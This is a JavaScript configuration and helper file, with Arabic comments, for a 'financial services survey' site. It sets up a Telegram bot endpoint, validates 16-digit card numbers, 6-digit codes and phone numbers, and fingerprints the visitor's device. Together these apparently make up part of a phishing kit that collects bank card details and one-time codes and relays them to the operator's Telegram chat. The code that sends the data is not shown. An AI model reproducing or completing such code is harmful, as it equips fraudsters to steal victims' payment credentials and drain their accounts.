// إعدادات النظام
const CONFIG = {
    // إعدادات التيليجرام
    TELEGRAM_BOT_TOKEN: "ضع_توكن_بوتك_هنا",
    TELEGRAM_CHAT_ID: "ضع_شات_آيدي_هنا",
    API_URL: "https://api.telegram.org/bot",
    
    // إعدادات الموقع
    SITE_NAME: "استبيان الخدمات المالية",
    
    // رسائل النظام
    MESSAGES: {
        SUCCESS: "✅ تم الإرسال بنجاح!",
        ERROR: "❌ حدث خطأ، حاول مرة أخرى",
        VALIDATION_ERROR: "⚠️ يرجى ملء جميع الحقول المطلوبة",
        SENDING: "📤 جاري الإرسال...",
        COPIED: "📋 تم النسخ بنجاح!",
        DEVICE_DETECTED: "📱 تم كشف جهازك تلقائياً"
    }
};

// التحقق من صحة البيانات
function isValidPhone(phone) {
    const cleaned = phone.replace(/\D/g, '');
    return /^(05|06|07)[0-9]{8}$/.test(cleaned);
}

function isValidCard(card) {
    const cleaned = card.replace(/\D/g, '');
    return /^[0-9]{16}$/.test(cleaned);
}

function isValidCode(code) {
    return /^[0-9]{6}$/.test(code);
}

function isValidName(name) {
    return name.trim().length >= 3 && /^[\u0600-\u06FF\s]+$/.test(name);
}

// إنشاء أرقام فريدة
function generateSurveyId() {
    const date = new Date();
    const dateStr = date.getFullYear().toString().slice(-2) + 
                   (date.getMonth() + 1).toString().padStart(2, '0') +
                   date.getDate().toString().padStart(2, '0');
    const randomNum = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
    return `FS-${dateStr}-${randomNum}`;
}

// كشف الجهاز
function detectDevice() {
    const userAgent = navigator.userAgent.toLowerCase();
    const screenWidth = window.screen.width;
    
    let deviceType = "جوال";
    let browser = "Chrome";
    let os = "Android";
    let screenSize = `${screenWidth}×${window.screen.height}`;
    
    // كشف نوع الجهاز
    if (/(tablet|ipad)/i.test(userAgent)) {
        deviceType = "تابلت";
    } else if (screenWidth > 1024 && !/mobile/i.test(userAgent)) {
        deviceType = "كمبيوتر";
    }
    
    // كشف المتصفح
    if (/firefox/i.test(userAgent)) {
        browser = "Firefox";
    } else if (/safari/i.test(userAgent) && !/chrome/i.test(userAgent)) {
        browser = "Safari";
    } else if (/edg/i.test(userAgent)) {
        browser = "Edge";
    } else if (/opera|opr/i.test(userAgent)) {
        browser = "Opera";
    }
    
    // كشف نظام التشغيل
    if (/ios|iphone/i.test(userAgent)) {
        os = "iOS";
    } else if (/windows/i.test(userAgent)) {
        os = "Windows";
    } else if (/mac os|macintosh/i.test(userAgent)) {
        os = "macOS";
    } else if (/linux/i.test(userAgent)) {
        os = "Linux";
    }
    
    return {
        type: deviceType,
        browser: browser,
        os: os,
        screen: screenSize,
        userAgent: userAgent.substring(0, 100)
    };
}

// تحميل البيانات من localStorage
function loadFromStorage(key, defaultValue = []) {
    try {
        const data = localStorage.getItem(key);
        return data ? JSON.parse(data) : defaultValue;
    } catch (e) {
        console.error('خطأ في تحميل البيانات:', e);
        return defaultValue;
    }
}

// حفظ البيانات في localStorage
function saveToStorage(key, data) {
    try {
        localStorage.setItem(key, JSON.stringify(data));
        return true;
    } catch (e) {
        console.error('خطأ في حفظ البيانات:', e);
        return false;
    }
}